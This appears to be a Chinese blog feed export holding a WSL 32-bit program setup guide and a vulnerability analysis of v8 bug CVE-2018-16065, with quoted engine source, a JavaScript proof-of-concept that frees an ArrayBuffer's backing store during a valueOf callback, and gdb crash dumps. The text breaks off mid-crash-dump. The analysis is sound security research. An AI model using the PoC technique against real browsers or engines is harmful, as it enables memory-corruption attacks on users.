    <content><![CDATA[<p>WSL1 下执行 x86 程序较为困难，需要进行较多步骤，并且存在局限性;</p>
<p>WSL2 下可以直接执行 x86 程序，但需要从 WSL1 中升级上去。</p>
<p>两种操作均较为麻烦，因此这里记录了一点笔者走过的弯路。</p>
<a id="more"></a>
<h2 id="1-WSL1">1. WSL1</h2>
<ul>
<li>
<p>直接复制以下指令至 wsl 中，执行完成之后 gcc / g++ 就<strong>可以成功编译 32 位程序并运行</strong>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动32位支持层</span></span><br><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 qemu</span></span><br><span class="line">sudo apt install qemu-user-static</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 x86 elf 在 qemu 中运行</span></span><br><span class="line">sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic <span class="string">'\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00'</span> --mask <span class="string">'\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">sudo service binfmt-support start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将启动服务命令别名 32 写入 .zshrc，并重新加载配置文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"alias 32='sudo service binfmt-support start'"</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装一些基本x86库</span></span><br><span class="line">sudo apt-get install g++-multilib libc6:i386 libgcc1:i386 gcc-9-base:i386 libstdc++6:i386</span><br><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>但是，即便可以编译并运行32位程序，但<strong>仍然无法被 gdb 调试</strong>，即 64位的 gdb 无法调试 32 位的程序。</p>
<p>报错提示所选体系结构 i386 与报告的目标体系结构 i386:x86-64 不兼容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">warning: Selected architecture i386 is not compatible with reported target architecture i386:x86-64</span><br><span class="line">warning: Architecture rejected target-supplied description</span><br></pre></td></tr></table></figure>
<p>此时就必须折中，使用以下这种方法:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在 qemu 中启动调试，端口号为 1234</span></span><br><span class="line">qemu-i386-static -g 1234 &lt;process&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新开一个终端，启动gdb</span></span><br><span class="line">gdb</span><br><span class="line"><span class="comment"># 在 gdb 中设置架构为 i386（不设置貌似也没事？）</span></span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture i386</span><br><span class="line"><span class="comment"># 连接至本地 1234 的 qemu 端口</span></span><br><span class="line">pwndbg&gt; target remote 127.0.0.1:1234</span><br><span class="line"><span class="comment"># 试图加载符号</span></span><br><span class="line">pwndbg&gt; file &lt;process&gt;</span><br></pre></td></tr></table></figure>
<p>不过这种方法有局限性，没办法将符号加载出来。</p>
<p>再一种更硬核的方式就是下载 gdb 源码并编译，不过暂且还没试过。</p>
<blockquote>
<p>直到目前为止，WSL64 下运行与调试 32 位程序仍然存在较大的困难。</p>
<p>所以我选择在 VM 里调试 32 位程序 XD。</p>
</blockquote>
</li>
<li>
<p>参考：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_40827990/article/details/83216139" target="_blank" rel="noopener">Linux64位子系统运行32位程序 - CSDN</a></li>
<li><a href="https://www.codeleading.com/article/24462195544/" target="_blank" rel="noopener">Win 64位Linux子系统运行32位elf程序(简洁明了/亲测可用) - 代码先锋网</a></li>
</ul>
</li>
</ul>
<h2 id="2-WSL2">2. WSL2</h2>
<ul>
<li>
<p><strong>WSL2可以直接运行 32 位程序</strong>（感谢 <a href="https://mundi-xu.github.io/" target="_blank" rel="noopener">@mudi-xu</a> 的提醒），因此我们希望 WSL1 最好能在不重装原先 Ubuntu 系统的情况下，直接升级到 WSL2。</p>
</li>
<li>
<p>但需要注意的是：WSL2只能在<strong>18917</strong> 之后的版本中才有。请自行运行命令 <code>winver</code> 以查看 <strong>OS 内部版本</strong>，如果版本低了，则需要升级一下 Windows OS。（现在我准备升级 windows 了 呜呜呜）</p>
</li>
<li>
<p>具体操作如下</p>
<ul>
<li>首先，以<strong>管理员权限</strong>执行<code>dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</code> 以<strong>启用“虚拟机平台”可选功能</strong>，之后<strong>重新启动</strong>计算机。</li>
<li>计算机重启后，执行 <code>wsl --list --verbose</code>  以查看当前的 WSL 镜像及其版本。</li>
<li>下载并安装<a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi" target="_blank" rel="noopener">适用于 x64 计算机的 WSL2 Linux 内核更新包</a></li>
<li>之后，执行 <code>wsl --set-version &lt;SubSystemName&gt; 2</code> 以升级 WSL1 至 WSL2。这可能需要几分钟的时间。</li>
<li>待升级完成后，可以再次执行 <code>wsl --list --verbose</code>以查看当前的 WSL 镜像 &amp; 版本。</li>
<li>最后执行 <code>wsl --set-default-version 2</code> 以设置之后安装的 Linux 子系统都安装到 WSL2 中。</li>
</ul>
</li>
<li>
<p>注意点：WSL2 与 VMware 15 <strong>不兼容</strong>。如果需要两者兼得则务必升级 VMware 至 <strong>16 版本</strong>。</p>
<blockquote>
<p>升级VMware时无需卸载之前的版本，可以直接双击新安装包升级。</p>
<p>升级时，务必勾选<strong>启用 Windows Hypervisor Platform</strong>，以支持 WSL2 和 VMware 的兼容。</p>
</blockquote>
</li>
<li>
<p>WSL2在使用过程中，可能报错：  <strong>参考的对象类型不支持尝试的操作</strong>。</p>
<p><img src="/2021/04/i386_WSL64/image-20210430132003438.png" alt="img"></p>
<p>有两种解决方法：</p>
<ul>
<li>
<p>第一种（不推荐）：执行 <code>netsh winsock reset</code>，重置 winsock，并重启。但这种方法只能是临时性质的。</p>
</li>
<li>
<p>第二种（推荐）：下载 <a href="/2021/04/i386_WSL64/NoLsp.zip" title="NoLsp.exe">NoLsp.exe</a>，并以管理员权限执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">NoLsp.exe c:\windows\system32\wsl.exe</span><br></pre></td></tr></table></figure>
<p>等到出现 <code>Success!</code>之后就可以正常使用 WSL2了。</p>
<p><img src="/2021/04/i386_WSL64/image-20210430132628877.png" alt="img"></p>
</li>
</ul>
<p>为什么解法2的方式如此独特呢？Proxifier 开发者发现：如果Winsock LSP DLL被加载到其进程中，则wsl.exe将显示此错误。因此最简单的解决方案是使用WSCSetApplicationCategory WinAPI调用wsl.exe来防止这种情况。</p>
<p>这个调用在<code>HKEY LOCAL MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\AppId Catalog</code>创建了一个wsl.exe的条目：</p>
<p><img src="/2021/04/i386_WSL64/image-20210430132755231.png" alt="img"></p>
<p>而这就是解法2的具体技术细节。</p>
</li>
<li>
<p>参考</p>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-win10" target="_blank" rel="noopener">适用于 Linux 的 Windows 子系统安装指南 (Windows 10) - microsoft docs</a></li>
<li><a href="https://blog.csdn.net/weixin_40955163/article/details/100555823" target="_blank" rel="noopener">WSL安装及升级WSL2 - CSDN</a></li>
<li><a href="https://github.com/microsoft/WSL/issues/4177#issuecomment-597736482" target="_blank" rel="noopener">Winsock module breaks WSL2 - WSL github issue</a></li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>wsl</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-16065 分析</title>
    <url>/2021/03/CVE-2018-16065/</url>
    <content><![CDATA[<h2 id="一、前言">一、前言</h2>
<p>CVE-2018-16065 是 v8 中 <code>EmitBigTypedArrayElementStore</code> 函数内部的一个漏洞。该漏洞在检查相应 ArrayBuffer 是否被 Detach（即是否是<code>neutered</code>）之后，执行了一个带有<strong>副作用</strong>的（即<strong>可调用用户 JS callback 代码</strong>的） <code>ToBigInt</code> 函数。而用户可在对应回调函数中将原先通过上述检查的 BigIntArray （即<strong>不是 neutered 的 TypedArray</strong>）重新变成 <code>neutered</code>。</p>
<p>这将使一部分数据被非法写入至一块已经 Detached 的 ArrayBuffer上。如果 GC 试图回收该 ArrayBuffer 的 backing store ，则会触发 CRASH。</p>
<a id="more"></a>
<h2 id="二、环境搭建">二、环境搭建</h2>
<p>切换 v8 版本，然后编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout 6.8.275.24</span><br><span class="line">gclient sync</span><br><span class="line">tools/dev/gm.py x64.debug</span><br></pre></td></tr></table></figure>
<h2 id="三、漏洞细节">三、漏洞细节</h2>
<ul>
<li>
<p>在执行 JS 代码  <code>BigInt64Array.of</code> 函数时，v8 将调用以下 <code>Builtin_TypedArrayOf</code>函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES6 #sec-%typedarray%.of</span></span><br><span class="line">TF_BUILTIN(TypedArrayOf, TypedArrayBuiltinsAssembler) &#123;</span><br><span class="line">  TNode&lt;Context&gt; context = CAST(Parameter(BuiltinDescriptor::kContext));</span><br><span class="line">  [...]</span><br><span class="line">  DispatchTypedArrayByElementsKind(</span><br><span class="line">      elements_kind,</span><br><span class="line">      [&amp;](ElementsKind kind, <span class="keyword">int</span> size, <span class="keyword">int</span> typed_array_fun_index) &#123;</span><br><span class="line">        TNode&lt;FixedTypedArrayBase&gt; elements =</span><br><span class="line">            CAST(LoadElements(new_typed_array));</span><br><span class="line">        BuildFastLoop(</span><br><span class="line">            IntPtrConstant(<span class="number">0</span>), length,</span><br><span class="line">            [&amp;](Node* index) &#123;</span><br><span class="line">              TNode&lt;Object&gt; item = args.AtIndex(index, INTPTR_PARAMETERS);</span><br><span class="line">              TNode&lt;IntPtrT&gt; intptr_index = UncheckedCast&lt;IntPtrT&gt;(index);</span><br><span class="line">              <span class="comment">// 如果当前的 TypeArray 是 BigIntArray</span></span><br><span class="line">              <span class="keyword">if</span> (kind == BIGINT64_ELEMENTS || kind == BIGUINT64_ELEMENTS) &#123;</span><br><span class="line">                <span class="comment">// 则剩余操作在 EmitBigTypedArrayElementStore 函数内部完成</span></span><br><span class="line">                EmitBigTypedArrayElementStore(new_typed_array, elements,</span><br><span class="line">                                              intptr_index, item, context,</span><br><span class="line">                                              &amp;if_neutered);</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                [...]</span><br><span class="line">              &#125;,</span><br><span class="line">            <span class="number">1</span>, ParameterMode::INTPTR_PARAMETERS, IndexAdvanceMode::kPost);</span><br><span class="line">      &#125;);</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于 BigIntArray 这类 TypedArray，v8 将在该函数中继续调用 <code>EmitBigTypedArrayElementStore</code> 函数，并在其中完成剩余的操作。</p>
</li>
<li>
<p><code>EmitBigTypedArrayElementStore</code> 函数较为简单，先看看源码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CodeStubAssembler::EmitBigTypedArrayElementStore</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    TNode&lt;JSTypedArray&gt; object, TNode&lt;FixedTypedArrayBase&gt; elements,</span></span></span><br><span class="line"><span class="function"><span class="params">    TNode&lt;IntPtrT&gt; intptr_key, TNode&lt;Object&gt; value, TNode&lt;Context&gt; context,</span></span></span><br><span class="line"><span class="function"><span class="params">    Label* opt_if_neutered)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (opt_if_neutered != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">// Check if buffer has been neutered.</span></span><br><span class="line">    Node* buffer = LoadObjectField(object, JSArrayBufferView::kBufferOffset);</span><br><span class="line">    GotoIf(IsDetachedBuffer(buffer), opt_if_neutered);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 获取 BigInt，其中 ToBigInt 函数会调用 JS 中的 [Object.valueOf] 函数</span></span><br><span class="line">  TNode&lt;BigInt&gt; bigint_value = ToBigInt(context, value);</span><br><span class="line">  TNode&lt;RawPtrT&gt; backing_store = LoadFixedTypedArrayBackingStore(elements);</span><br><span class="line">  TNode&lt;IntPtrT&gt; offset = ElementOffsetFromIndex(intptr_key, BIGINT64_ELEMENTS,</span><br><span class="line">                                                 INTPTR_PARAMETERS, <span class="number">0</span>);</span><br><span class="line">  EmitBigTypedArrayElementStore(elements, backing_store, offset, bigint_value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以很容易的发现，如果 BigIntArray 的 ArrayBuffer 是 neutered 的，那么就直接跳到指定的 Label 处进行异常处理，不会再继续向下执行，也就是说 <strong>不会再将 elements 写入至 backing_store</strong>。</p>
<p>但 <code>ToBigInt</code> 函数有点特殊，它将调用 Object.valueOf 属性的函数来获取值，而<strong>这个函数是可以被用户定义的</strong>。如果我们在该函数中，将当前 BigIntArray 的 ArrayBuffer 设置为 neutered ，那么下面执行写入操作时，数据写入的位置将是刚刚被 detach 的 ArrayBuffer 中。这是一步非法操作，如果 GC 试图回收该 ArrayBuffer 的 backing store ，那么这将使 GC 触发崩溃。</p>
</li>
<li>
<p>这里需要说明一下 <code>neutered</code> 的含义。即什么样的 ArrayBuffer 将会被视为 neutered 的？如何设置某个 Array 为 neutered ？</p>
<ul>
<li>
<p>通过查阅 <a href="https://v8docs.nodesource.com/node-10.15/d5/d6e/classv8_1_1_array_buffer.html#ab73b5545800351ec54c4c0ac002f9d81" target="_blank" rel="noopener">v8 docs</a> ，我们可以简单了解到，Neuter 这个操作，会将 Buffer 和所有 typed Array 的长度设置为0，从而防止JavaScript访问底层 backing_store。</p>
</li>
<li>
<p>我们再来看一下 v8 中的一个 Runtime 函数：<code>ArrayBufferNeuter</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">RUNTIME_FUNCTION(Runtime_ArrayBufferNeuter) &#123;</span><br><span class="line">  <span class="function">HandleScope <span class="title">scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  DCHECK_EQ(<span class="number">1</span>, args.length());</span><br><span class="line">  Handle&lt;Object&gt; argument = args.at(<span class="number">0</span>);</span><br><span class="line">  <span class="comment">// This runtime function is exposed in ClusterFuzz and as such has to</span></span><br><span class="line">  <span class="comment">// support arbitrary arguments.</span></span><br><span class="line">  <span class="comment">// 该函数只对 ArrayBuffer 类型的参数效果，若传入其他类型则引出异常</span></span><br><span class="line">  <span class="keyword">if</span> (!argument-&gt;IsJSArrayBuffer()) &#123;</span><br><span class="line">    THROW_NEW_ERROR_RETURN_FAILURE(</span><br><span class="line">        isolate, NewTypeError(MessageTemplate::kNotTypedArray));</span><br><span class="line">  &#125;</span><br><span class="line">  Handle&lt;JSArrayBuffer&gt; array_buffer = Handle&lt;JSArrayBuffer&gt;::cast(argument);</span><br><span class="line">  <span class="comment">// 如果当前 ArrayBuffer 不可被设置为 neuter,则不用继续执行下去，直接返回</span></span><br><span class="line">  <span class="keyword">if</span> (!array_buffer-&gt;is_neuterable()) &#123;</span><br><span class="line">    <span class="keyword">return</span> isolate-&gt;heap()-&gt;undefined_value();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果该 ArrayBuffer 的 backing_store 为空，检查 arraybuffer 的 length 是否为0。这一步是检查当前 ArrayBuffer 是否已经是 neutered 的。</span></span><br><span class="line">  <span class="keyword">if</span> (array_buffer-&gt;backing_store() == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    CHECK_EQ(Smi::kZero, array_buffer-&gt;byte_length());</span><br><span class="line">    <span class="keyword">return</span> isolate-&gt;heap()-&gt;undefined_value();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Shared array buffers should never be neutered.</span></span><br><span class="line">  CHECK(!array_buffer-&gt;is_shared());</span><br><span class="line">  DCHECK(!array_buffer-&gt;is_external());</span><br><span class="line">  <span class="comment">// 准备开始 neuter 了，先获取 backing_store 指针和当前 ArrayBuffer 的长度</span></span><br><span class="line">  <span class="keyword">void</span>* backing_store = array_buffer-&gt;backing_store();</span><br><span class="line">  <span class="keyword">size_t</span> byte_length = NumberToSize(array_buffer-&gt;byte_length());</span><br><span class="line">  array_buffer-&gt;set_is_external(<span class="literal">true</span>);</span><br><span class="line">  <span class="comment">// 将当前 ArrayBuffer 从ArrayBufferTracker中移除</span></span><br><span class="line">  isolate-&gt;heap()-&gt;UnregisterArrayBuffer(*array_buffer);</span><br><span class="line">  <span class="comment">// 开始执行 neuter 操作</span></span><br><span class="line">  array_buffer-&gt;Neuter();</span><br><span class="line">  <span class="comment">// 将backing_store占用的内存空间释放</span></span><br><span class="line">  isolate-&gt;array_buffer_allocator()-&gt;Free(backing_store, byte_length);</span><br><span class="line">  <span class="keyword">return</span> isolate-&gt;heap()-&gt;undefined_value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JSArrayBuffer::Neuter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  CHECK(is_neuterable());</span><br><span class="line">  CHECK(!was_neutered());</span><br><span class="line">  CHECK(is_external());</span><br><span class="line">  <span class="comment">// 将当前 backing store 移除</span></span><br><span class="line">  set_backing_store(<span class="literal">nullptr</span>);</span><br><span class="line">  <span class="comment">// 设置当前 length 为 0</span></span><br><span class="line">  set_byte_length(Smi::kZero);</span><br><span class="line">  set_was_neutered(<span class="literal">true</span>);</span><br><span class="line">  set_is_neuterable(<span class="literal">false</span>);</span><br><span class="line">  <span class="comment">// Invalidate the neutering protector.</span></span><br><span class="line">  Isolate* <span class="keyword">const</span> isolate = GetIsolate();</span><br><span class="line">  <span class="keyword">if</span> (isolate-&gt;IsArrayBufferNeuteringIntact()) &#123;</span><br><span class="line">    isolate-&gt;InvalidateArrayBufferNeuteringProtector();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单读一下源码，我们也可以很容易的发现，<strong>ArrayBuffer 的 neuter 操作 就是删除 ArrayBuffer 中的 backing store 并重置其 length 字段。</strong></p>
</li>
</ul>
<p>综上所述，neuter 的具体操作已经非常明确了，如果不明确的话还可以使用 <code>%DebugPrint</code> 比较一下 neuter   前后的差异。</p>
<p>接下来我们看看 Poc。</p>
</li>
</ul>
<h2 id="四、PoC">四、PoC</h2>
<ul>
<li>
<p>POC 如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// flags: --allow-natives-syntax --expose-gc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> BigInt64Array(<span class="number">11</span>);</span><br><span class="line"><span class="comment">// constructor 返回数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">constructor</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> array &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evil_callback</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  print(<span class="string">"callback"</span>);</span><br><span class="line">  %ArrayBufferNeuter(array.buffer);</span><br><span class="line">  gc();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xdeadbeefn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> evil_object = &#123;<span class="attr">valueOf</span>: evil_callback&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> root = BigInt64Array.of.call(</span><br><span class="line">  <span class="keyword">constructor</span>,</span><br><span class="line">  evil_object</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">gc(); // trigger</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>分析上面的 POC，可以理出一条这样的漏洞触发过程：</p>
<ul>
<li>首先执行 BigInt64Array.of.call ，其中 多调用了一个 call 是为了使 constructor 函数和 设置的 element 都可以操作同一个 array。</li>
<li>初始时， array 的 backing_store 存在，因此将绕过 v8  <code>EmitBigTypedArrayElementStore</code> 函数中的 ArrayBuffer <strong>neutered</strong> 检查，进入 <strong>ToBigInt</strong> 函数。</li>
<li>ToBigInt 函数将会获取传入 element 的值，因此便会调用 evil_object.valueOf 函数，即调用 evil_callback JS 函数。</li>
<li>该函数将执行 v8 Runtime 函数 <code>%ArrayBufferNeuter</code>，释放 array 中 ArrayBuffer 的 backing_store。</li>
<li>完成以上操作后，v8 <code>EmitBigTypedArrayElementStore</code>  函数中的 ToBigInt 函数将返回，此时继续执行，试图将 element 写入之前保存的 backing_store 里。</li>
<li>由于该 ArrayBuffer 已经被 detached，因此这样的写入将修改该 backing_store 上的一些用于 GC 的元数据，使最后在执行 GC 时触发崩溃。</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>将值写入至 Detached ArrayBuffer</strong> 时，因为其 heap chunk 仍然是 <strong>allocated</strong> 的，因此不存在 UaF。</p>
</blockquote>
<ul>
<li>
<p>gdb 可能的两种崩溃输出如下：</p>
<ul>
<li>
<p>第一种</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /usr/class/v8/v8/out/x64.debug/d8 --allow-natives-syntax --expose-gc test.js</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span>.</span><br><span class="line">[New Thread 0x7fe86accc700 (LWP 84765)]</span><br><span class="line">[New Thread 0x7fe86a4cb700 (LWP 84766)]</span><br><span class="line">[New Thread 0x7fe869cca700 (LWP 84767)]</span><br><span class="line">[New Thread 0x7fe8694c9700 (LWP 84768)]</span><br><span class="line">[New Thread 0x7fe868cc8700 (LWP 84769)]</span><br><span class="line">[New Thread 0x7fe8684c7700 (LWP 84770)]</span><br><span class="line">[New Thread 0x7fe867cc6700 (LWP 84771)]</span><br><span class="line">callback</span><br><span class="line"></span><br><span class="line">Thread 1 <span class="string">"d8"</span> received signal SIGSEGV, Segmentation fault.</span><br><span class="line">tcache_get (tc_idx=4) at malloc.c:2951</span><br><span class="line">2951      --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x5606a95b6030 ◂— 0x10000</span><br><span class="line"> RBX  0x4</span><br><span class="line"> RCX  0x5606a95b6018 ◂— 0x10001</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x58</span><br><span class="line"> RSI  0x7ffe89539b58 —▸ 0x5606a95d2ef0 —▸ 0x7ffe8953ba10 ◂— 0x5606a95d2ef0</span><br><span class="line"> R8   0xdeadbeef</span><br><span class="line"> R9   0x7ffe89539b6c ◂— 0x89539df800000002</span><br><span class="line"> R10  0x58</span><br><span class="line"> R11  0x58</span><br><span class="line"> R12  0xffffffffffffffa8</span><br><span class="line"> R13  0x5606a95d2fb8 —▸ 0x283c80e82ba9 ◂— 0x283c80e822</span><br><span class="line"> R14  0x5</span><br><span class="line"> R15  0x7ffe8953ab08 —▸ 0x354172782e39 ◂— 0xb1000005ceeae0ae</span><br><span class="line"> RBP  0x58</span><br><span class="line"> RSP  0x7ffe89539990 —▸ 0x7fe86cf8d220 ◂— push   rbp</span><br><span class="line"> RIP  0x7fe86b7227be (malloc+286) ◂— mov    rsi, qword ptr [r8]</span><br><span class="line">───────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7fe86b7227be &lt;malloc+286&gt;    mov    rsi, qword ptr [r8]</span><br><span class="line">   0x7fe86b7227c1 &lt;malloc+289&gt;    mov    qword ptr [rax + 0x80], rsi</span><br><span class="line">   0x7fe86b7227c8 &lt;malloc+296&gt;    mov    word ptr [rcx], dx</span><br><span class="line">   0x7fe86b7227cb &lt;malloc+299&gt;    mov    qword ptr [r8 + 8], 0</span><br><span class="line">   0x7fe86b7227d3 &lt;malloc+307&gt;    jmp    malloc+184 &lt;malloc+184&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7fe86b722758 &lt;malloc+184&gt;    pop    rbx</span><br><span class="line">   0x7fe86b722759 &lt;malloc+185&gt;    mov    rax, r8</span><br><span class="line">   0x7fe86b72275c &lt;malloc+188&gt;    pop    rbp</span><br><span class="line">   0x7fe86b72275d &lt;malloc+189&gt;    pop    r12</span><br><span class="line">   0x7fe86b72275f &lt;malloc+191&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   0x7fe86b722760 &lt;malloc+192&gt;    and    rax, 0xfffffffffffffff0</span><br><span class="line">───────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────</span><br><span class="line">In file: /build/glibc-TrjWJf/glibc-2.29/malloc/malloc.c</span><br><span class="line">   2946 &#123;</span><br><span class="line">   2947   tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">   2948   assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">   2949   assert (tcache-&gt;entries[tc_idx] &gt; 0);</span><br><span class="line">   2950   tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line"> ► 2951   --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">   2952   e-&gt;key = NULL;</span><br><span class="line">   2953   <span class="built_in">return</span> (void *) e;</span><br><span class="line">   2954 &#125;</span><br><span class="line">   2955 </span><br><span class="line">   2956 static void</span><br><span class="line">───────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7ffe89539990 —▸ 0x7fe86cf8d220 ◂— push   rbp</span><br><span class="line">01:0008│      0x7ffe89539998 —▸ 0x7ffe895399e0 —▸ 0x7ffe89539aa0 —▸ 0x7ffe89539de0 —▸ 0x7ffe89539e00 ◂— ...</span><br><span class="line">02:0010│      0x7ffe895399a0 ◂— 0xffffffffffffffff</span><br><span class="line">03:0018│      0x7ffe895399a8 —▸ 0x7fe86bb459d8 ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">04:0020│      0x7ffe895399b0 ◂— 0x2a100</span><br><span class="line">05:0028│      0x7ffe895399b8 —▸ 0x5606a962c3d0 ◂— 0x0</span><br><span class="line">06:0030│      0x7ffe895399c0 —▸ 0x5606a962c370 ◂— 0x0</span><br><span class="line">07:0038│      0x7ffe895399c8 —▸ 0x5606a962d3f0 —▸ 0x7fe86e241580 —▸ 0x7fe86d76e780 (v8::internal::CodeSpace::~CodeSpace()) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0     7fe86b7227be malloc+286</span><br><span class="line">   f 1     7fe86b7227be malloc+286</span><br><span class="line">   f 2     7fe86bb459d8</span><br><span class="line">   f 3     7fe86d823957</span><br><span class="line">   f 4     7fe86d8209a1</span><br><span class="line">   f 5     7fe86d8168de</span><br><span class="line">   f 6     7fe86d816309 v8::internal::Sweeper::StartSweeperTasks()+857</span><br><span class="line">   f 7     7fe86d7932b7 v8::internal::MarkCompactCollector::Finish()+343</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>第二种</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /usr/class/v8/v8/out/x64.debug/d8 --allow-natives-syntax --expose-gc test.js</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span>.</span><br><span class="line">[New Thread 0x7f1802341700 (LWP 87692)]</span><br><span class="line">[New Thread 0x7f1801b40700 (LWP 87693)]</span><br><span class="line">[New Thread 0x7f180133f700 (LWP 87694)]</span><br><span class="line">[New Thread 0x7f1800b3e700 (LWP 87695)]</span><br><span class="line">[New Thread 0x7f180033d700 (LWP 87696)]</span><br><span class="line">[New Thread 0x7f17ffb3c700 (LWP 87697)]</span><br><span class="line">[New Thread 0x7f17ff33b700 (LWP 87698)]</span><br><span class="line">callback</span><br><span class="line"></span><br><span class="line">Thread 1 <span class="string">"d8"</span> received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00007f180468f76b <span class="keyword">in</span> std::__1::__hash_table&lt;std::__1::__hash_value_type&lt;unsigned long, v8::internal::Cancelable*&gt;, std::__1::__unordered_map_hasher&lt;unsigned long, std::__1::__hash_value_type&lt;unsigned long, v8::internal::Cancelable*&gt;, std::__1::<span class="built_in">hash</span>&lt;unsigned long&gt;, <span class="literal">true</span>&gt;, std::__1::__unordered_map_equal&lt;unsigned long, std::__1::__hash_value_type&lt;unsigned long, v8::internal::Cancelable*&gt;, std::__1::equal_to&lt;unsigned long&gt;, <span class="literal">true</span>&gt;, std::__1::allocator&lt;std::__1::__hash_value_type&lt;unsigned long, v8::internal::Cancelable*&gt; &gt; &gt;::__emplace_unique_key_args&lt;unsigned long, std::__1::piecewise_construct_t const&amp;, std::__1::tuple&lt;unsigned long const&amp;&gt;, std::__1::tuple&lt;&gt; &gt;(unsigned long const&amp;, std::__1::piecewise_construct_t const&amp;, std::__1::tuple&lt;unsigned long const&amp;&gt;&amp;&amp;, 